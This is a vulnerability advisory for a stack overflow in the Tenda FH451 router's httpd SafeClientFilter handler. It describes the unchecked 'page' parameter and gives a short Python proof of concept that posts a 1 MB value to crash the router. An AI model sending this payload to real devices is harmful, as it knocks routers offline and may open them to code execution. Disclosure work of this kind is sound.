# Stack Overflow Vulnerability in Tenda FH451 Router (v1.0.0.9) â€“ SafeClientFilter Component
**Vendor**: Shenzhen Jixiang Tenda Technology Co., Ltd.
**Affected Firmware**: [Download Link](https://tenda.com.cn/material/show/101629)
**Vulnerability URL**: `http://192.168.200.1:80/goform/SafeClientFilter`
**Vulnerability File**: `/bin/httpd`

## Vulnerability Description

Through code auditing, a critical security risk has been identified in the `SafeClientFilter` routing function (Line 35) . 

![image-20250522110500362](../image-20250522110500362.png)

Specifically, the program retrieves the input parameter "page" but lacks proper validation for its numerical range (Line 39).

![image-20250522110316779](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522110316779.png)

Cross-referenced to the function `sub_64EAC`, with attention to lines 44 and 47.

![image-20250522110610289](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522110610289.png)

The path of the webpage where the vulnerability occurs is known to be `goform/SafeClientFilter`.

## PoC 

```python
import requests

url = "http://192.168.200.1:80/goform/SafeClientFilter"

payload = {
   'page': b'a'*(0x100000)
}

res = requests.post(url=url, data=payload)
print("Status Code:", res.status_code)
print("Response:", res.text)
```

## Reproduction Steps

**1. Environment Setup**:
Simulate the router firmware using QEMU

!![image-20250522110739954](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522110739954.png)

**2. Router Initialization**:
Ensure the router is running and accessible via `http://192.168.200.1`.

![image-20250522110755361](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522110755361.png)

**3. Exploit Execution**:
Run the PoC script. The router will crash, rendering the web interface inaccessible.



![image-20250522110943875](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522110943875.png)

![image-20250522111000926](./The router Tenda FH451 V1.0.0.9 of Shenzhen Jixiang Tenda Technology Co., Ltd. has a stack overflow vulnerability.assets/image-20250522111000926.png)



The router has crashed, and the web interface is also inaccessible.

## Impact 

Remote attackers can exploit this vulnerability to crash the router (`httpd` process) or potentially execute arbitrary code.
